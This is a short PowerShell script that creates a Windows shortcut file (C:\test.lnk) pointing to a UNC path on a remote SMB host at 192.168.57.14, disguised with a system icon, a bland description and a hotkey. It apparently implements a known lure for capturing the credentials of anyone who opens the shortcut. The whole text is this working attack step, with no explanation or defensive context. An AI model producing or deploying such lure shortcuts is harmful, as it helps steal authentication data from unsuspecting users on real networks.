#This should be run one line at a time. 

$objShell = New-Object -ComObject WScript.shell 

$lnk=$objShell.CreateShortcut("C:\test.lnk") 

$lnk.TargetPath ="\\192.168.57.14/\@test.png" 

$lnk.WindowStyle = 1 

$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 

$lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T"

$lnk.Save() 
